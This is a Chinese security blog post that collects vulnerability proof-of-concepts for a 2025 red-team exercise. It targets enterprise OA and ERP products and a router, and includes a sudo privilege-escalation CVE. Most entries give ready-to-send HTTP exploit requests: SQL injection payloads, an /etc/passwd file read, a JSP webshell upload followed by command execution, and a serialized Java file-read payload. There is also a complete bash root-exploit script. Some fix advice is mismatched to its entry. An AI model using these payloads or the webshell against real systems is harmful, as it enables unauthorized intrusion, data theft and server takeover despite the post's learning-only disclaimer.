> **原文链接**: https://mp.weixin.qq.com/s?__biz=MzIxMTg1ODAwNw==&mid=2247500923&idx=1&sn=7eb27e3f909442571fa32be3a1dab150

#  【2025护网漏洞POC速存】吃苕皮喝挪瓦，HW轻松拿捏  
安全透视镜  网络安全透视镜   2025-07-05 03:27  
  
# 文章来源互联网收集整理，请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息或者工具而造成的任何直接或者间接的后果及损失，均由使用者本人负责，所产生的一切不良后果与文章作者无关。该文章仅供学习用途使用。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/apNprpz3YS51gqsJwIM82Y5RTicXUygDUxQ76EiavrIibm8L0BUzdF6veUR4dQOKJn2iaEFQlNeq0PIPSFXTibx0OZw/640?wx_fmt=png&from=appmsg "")  
  
  
  
漏洞名称：泛微 OA 前台登录绕过+后台 RCE  
  
漏洞描述：  
  
/dwr/call 接口密钥泄露：攻击者通过调用接口/dwr/call/plaincall/，  
  
指定 WorkflowSubwfSetUtil.LoadTemplateProp 方法，可读取系统硬编码的 AES密钥  
  
修复建议：  
  
升级至安全版本，官方修复版本：≥ v10.57.2  
  
  
漏洞名称：IBM WebSphere Application Server 远程代码执行漏洞  
  
漏洞描述：  
  
IBM WebSphere Application Server 对反序列化操作的安全控制机制存在严重缺陷。当系统处理远程客户端传入的序列化数据时，未能实施有效的对象类型校验和来源认证，使得攻击者能够构造包含恶意调用链的特制序列化对象。这些对象在反序列化过程中会触发 Java 反射机制，通过精心设计的对象链最终执行 Runtime.exec()等敏感系统调用，导致攻击者能够以 WebSphere服务账户权限在目标服务器上执行任意命令。  
  
  
修复建议  
：  
  
尽快安装补丁进行防护。  
  
下载链接：https://www.ibm.com/support/pages/node/7237824  
  
  
漏洞名称：  
用友 畅捷通T+ 信息泄露  
  
漏洞描述：  
  
getdecallusers 存在信息泄露漏洞，可获取系统用户个人信息。  
  
修复建议：  
  
请及时联系官方售后或客服升级至最新版本，官网地址：https://www.chanjet.com/  
  
  
漏洞名称：  
RuoYi 任意文件读取漏洞  
  
漏洞描述  
：  
  
/demo/mail/sendMessageWithAttachment和 /sendMessageWithAttachments 接口未进行身份验证，攻击者可指定任意文件路径作为附件发送邮件，导致服务器敏感信息泄露  
。  

```
GET /demo/mail/sendMessageWithAttachment?to=test111@163.com&subject=Test-Mail&text=This%20is%20a%20test%20message&filePath=/etc/passwd HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) Firefox/123.0
```

  
修复建  
议：  
  
限制访问 /demo/mail/sendMessageWithAttachment和 /demo/mail/sendMessageWithAttachments 接口  或 升级至 RuoYi-Vue-Plus ≥ 5.4.1 版本  
  
  
漏  
洞名称  
：用友NC changeEvent SQL注入漏洞  
  
漏洞描述：  
  
changeEvent接口存在SQL注入漏洞，未授权攻击者可获取数据库权限并导致服务器失陷。  
  
修复建议：  
  
限制访问  
/weaver/weaver.email.FileDownloadLocation/login/LoginSSOxjsp/x.FileDownloadLocation路径  
  
  
漏洞名称：  
汉王e脸通综合管理平台SQL注入漏洞  
  
漏洞描述：  
  
queryManyPeopleGroupList.do接口存在SQL注入漏洞，攻击者可获取数据库敏感信息。  
  
修复建议：  
  
限制访问  
/manage/authMultiplePeople/queryManyPeopleGroupList.do  
  
  
漏洞名称：  
明源地产ERP身份认证绕过漏洞  
  
漏洞描述：  
  
明源地产ERP存在未公开身份认证绕过漏洞，攻击者可绕过验证直接访问管理后台窃取企业信息。检  
  
修复建议：  
  
监测  
/PubPlatform/nav/login/sso/login.aspx及user_info的请求  
  
  
漏洞名称：  
NiBox路由器SQL注入漏洞  
  
漏洞描述：  
  
authentication/update_byod.php接口存在SQL注入漏洞  

```
POST /authentication/update_byod.php HTTP/1.1
Host: 
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36
Accept-Encoding: gzip, deflate
Connection: close


update=1&macAddress=1' AND (SELECT 2222 FROM (SELECT(SLEEP(5)))ogZo) AND 'NXsn'='NXsn&oldMacAddress=
```

  
  
漏洞名称：  
深信服运维安全管理系统全版本命令执行漏洞  
  
漏洞描述；  
  
攻击者可利用未公开漏洞绕过认证，通过特定接口实现远程命令执行，获取服务器控制权限  
  
修复建议：  
  
1.立即联系厂商获取安全补丁；2.限制管理端口访问权限；  
  
  
漏洞名称：  
泛微OA全版本目录信息泄露  
  
漏洞描述：  
  
 jqueryFileTree.jsp目录信息泄露漏洞，  
攻击者通过dir参数遍历服务器目录导致敏感信息泄露  
  
修复建议：  
  
删除或重命名jqueryFileTree.jsp  
  
  
漏洞名称：  
安科瑞智能环保云平台  
  
漏洞描述：  
  
/getmonitorrealdata接口存在SQL注入漏洞，可获取数据库权限  
  
修复建议：  
  
部署SQL注入防护产品  
  
  
漏洞名称：  
金和OA全版本  
SQL注入漏洞  
  
漏洞描述：  
  
/C6/JHSoft.Web.DailyTaskManage/TaskTreeJsoN.aspx存在SQL注入漏洞  
  
修复建议:  
  
部署SQL注入防护产品  
  
  
漏洞名称：  
用友NC listUserSharingEvents 存在SQL注入  
  
漏洞描述：  

```
GET /portal/pt/oacoSchedulerEvents/listUserSharingEvents?agent=1')+AND+1=dbms_pipe.receive_message('RDS',5)--&pageId=login&sch_ed=2&sch_sd=1 HTTP/1.1
Host: 
Accept-Encoding: gzip, deflate
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:139.0) Gecko/20100101 Firefox/139.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
```

  
  
漏洞描述：  
用友NC changeEvent 存在SQL注入  
  
漏洞描述：  

```
POST /portal/pt/oacoSchedulerEvents/changeEvent?pageId=login HTTP/1.1
Host:
Content-Type: application/x-www-form-urlencoded


event_id=1' AND 1=dbms_pipe.receive_message('RDS',5)--+#&startDate=2025-07-01 00:00:00&startDate_old=2025-07-01 24:00:00
```

  
  
漏洞名称：  
用友NC-Cloud IBapIOService存在SQL注入  
  
漏洞描述：  

```
POST /uapws/service/nc.itf.bap.service.IBapIOService HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:136.0) Gecko/20100101 Firefox/136.0
Accept: */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Content-Type: text/xml


<?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34; standalone=&#34;no&#34;?>
<soapenv:Envelope xmlns:soapenv=&#34;http://schemas.xmlsoap.org/soap/envelope/&#34; xmlns:gs=&#34;http://service.bap.itf.nc/IBapIOService&#34;>
    <soapenv:Header/>
    <soapenv:Body>
        <gs:getBapTableDatas>
            <gs:stringarrayItem>
                DWQueue@MessageQueue' AND 1=UTL_INADDR.GET_HOST_ADDRESS('~'||(user)||'~')-- abc
            </gs:stringarrayItem>
        </gs:getBapTableDatas>
    </soapenv:Body>
</soapenv:Envelope>
```

  
  
漏洞名称：  
用友NC qrySubPurchaseOrgByParentPk 存在SQL注入  
  
漏洞描述：  

```
POST /ebvp/register/qrySubPurchaseOrgByParentPk HTTP/1.1
Host: 
Content-Type: application/x-www-form-urlencoded


pk_group=1' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('RDS',5) --
```

  
  
漏洞名称：  
用友FE协同平台存在文件上传  
  
漏洞描述：  

```
POST /common/uploadFile.jsp?action=save&savePath=/images/upload/&fileName=123.jpg&title1=%C9%CF%B4%AB%CE%C4%BC%FE&title2=%D1%A1%D4%F1%CE%C4%BC%FE&allowsize=null&extName=.jsp HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.1018.84 Safari/537.36
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary123456789




------WebKitFormBoundary123456789
Content-Disposition: form-data; name=&#34;accessory&#34;; filename=&#34;123.jsp&#34;
Content-Type: application/octet-stream


<%
 out.println(&#34;e165421110ba03099a1c0393373c5b43&#34;);
new java.io.File(application.getRealPath(request.getServletPath())).delete();
%>
------WebKitFormBoundary123456789--


```

  
访问上传后的文件（GET）  

```
GET /images/upload/123.jsp HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.2331.38 Safari/537.36


```

  
漏洞利用请求（上传 WebShell + 执行命令）  

```
POST /common/uploadFile.jsp?action=save&savePath=/images/upload/&fileName=123.jpg&title1=%C9%CF%B4%AB%CE%C4%BC%FE&title2=%D1%A1%D4%F1%CE%C4%BC%FE&allowsize=null&extName=.jsp HTTP/1.1
Host: target.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.1018.84 Safari/537.36
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary123456789




------WebKitFormBoundary123456789
Content-Disposition: form-data; name=&#34;accessory&#34;; filename=&#34;123.jsp&#34;
Content-Type: application/octet-stream


<%
java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter(&#34;cmd&#34;)).getInputStream();
int a = -1;byte[] b = new byte[2048];
while((a=in.read(b))!=-1){out.println(new String(b));}
new java.io.File(application.getRealPath(request.getServletPath())).delete();
%>
------WebKitFormBoundary123456789--


```

  
访问 WebShell 执行命令  

```
GET /images/upload/123.jsp?cmd=whoami HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.2331.38 Safari/537.36


```

  
  
漏洞描述：  
用友U8 Cloud FileManageServlet存在任意文件读取  
  
漏洞描述：  

```
POST /service/FileManageServlet HTTP/1.1
Host:
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Connection: close
Content-Type: application/octet-stream


{{unquote(&#34;\xac\xed\x00\x05sr\x00\x11java.util.HashMap\x05\x07\xda\xc1\xc3\x16`\xd1\x03\x00\x02F\x00\x0aloadFactorI\x00\x09thresholdxp?@\x00\x00\x00\x00\x00\x0cw\x08\x00\x00\x00\x10\x00\x00\x00\x03t\x00\x04patht\x00\x12C:\\Windows\\win.init\x00\x06dsNamet\x00\x03plmt\x00\x08operTypet\x00\x0ddownloadlocalx&#34;)}}
```

  
  
  
漏洞名称：  
用友BIP数据应用服务存在未授权访问  
  
漏洞描述：  

```
GET /bi/api/SemanticModel/GetOlapConnectionList/?token=e30fe47a-f33e-463e-bc4a-843957ca88dd_263720ea7e397482da220115cae828_1214162142339 HTTP/1.1
Host: target.com
Accept: application/json
Connection: close


```

  
  
漏洞名称：  
 CVE-2025-32463    
 sudo提权  
  
漏洞描述：  

```
#!/bin/bash
# sudo-chwoot.sh
# CVE-2025-32463 – Sudo EoP Exploit PoC by Rich Mirch
#                  @ Stratascale Cyber Research Unit (CRU)
STAGE=$(mktemp -d /tmp/sudowoot.stage.XXXXXX)
cd ${STAGE?} || exit 1


cat > woot1337.c<<EOF
#include <stdlib.h>
#include <unistd.h>


__attribute__((constructor)) void woot(void) {
  setreuid(0,0);
  setregid(0,0);
  chdir(&#34;/&#34;);
  execl(&#34;/bin/bash&#34;, &#34;/bin/bash&#34;, NULL);
}
EOF


mkdir -p woot/etc libnss_
echo &#34;passwd: /woot1337&#34; > woot/etc/nsswitch.conf
cp /etc/group woot/etc
gcc -shared -fPIC -Wl,-init,woot -o libnss_/woot1337.so.2 woot1337.c


echo &#34;woot!&#34;
sudo -R woot woot
rm -rf ${STAGE?}
```

  
  
漏洞名称：  
畅捷通T+ GLSyncService.asmx SQL注入漏洞  
  
漏洞描述：  
  
/tplus/GLSyncService.asmx接口存在SOAP注入漏洞  

```
POST /tplus/GLSyncService.asmx HTTP/1.1
Host: {{Hostname}}
SOAPAction: &#34;http://www.chanjet.com/GetSourceAccountDataTable&#34;
Content-Type: text/xml; charset=utf-8


<?xml version=&#34;1.0&#34; encoding=&#34;utf-8&#34;?>
<soap:Envelope xmlns:soap=&#34;http://schemas.xmlsoap.org/soap/envelope/&#34;>
  <soap:Body>
    <GetSourceAccountDataTable xmlns=&#34;http://www.chanjet.com/&#34;>
      <versionType>' UNION ALL SELECT NULL,@@VERSION,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- VsIH</versionType>
    </GetSourceAccountDataTable>
  </soap:Body>
</soap:Envelope>
```

  
  
其他  
  
  
帆软报表  
fr_remote_design 接口存在未授权文件上传漏洞  
  
  
  
美特 CRM  
sendsms.jsp 存在任意文件上传漏洞  
  
  
畅捷通T+ keyEdit.aspx SQL注入  
  
浪擎DAYS灾备任意文件上传  
  
圣博润堡垒机远程代码执行  
  
浪潮GS任意文件读取  
  
唯德知识产权管理系统 WSDownloadPDF存在任意文件读取漏洞  
  
华天软件Inforcenter PLM 存在任意文件读取漏洞  
  
昂捷CRM UploadFile 存在文件上传致RCE漏洞  
  
泛微OA E-cology plugin.xml存在未授权访句  
  
汉王e脸通综合管理平台  
  
queryMeetingFile.do 存在SOL注入漏洞美特CRM sendsms.jsp 文件上传致RCE漏洞泛微OA前台登录绕过+后台组合拳RCE  
  
汉王e脸通综合管理平台  
  
queryMeetingFile.do SOL注入漏洞  
  
Brother打印机mnt info.csv默认管理员密码  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/apNprpz3YS5MicTBA1bNPFaYlLsEe8lBKmQm5MXGXffuYI2cJp6Vlfia6JI4eG8aia6MVnP4IznHqL0xaxEPWNvCw/640?wx_fmt=jpeg&from=appmsg "")  
  
  
# 文章来源互联网收集整理，请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息或者工具而造成的任何直接或者间接的后果及损失，均由使用者本人负责，所产生的一切不良后果与文章作者无关。该文章仅供学习用途使用。  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/apNprpz3YS51gqsJwIM82Y5RTicXUygDUxQ76EiavrIibm8L0BUzdF6veUR4dQOKJn2iaEFQlNeq0PIPSFXTibx0OZw/640?wx_fmt=png&from=appmsg "")  
  
  
  
  
  
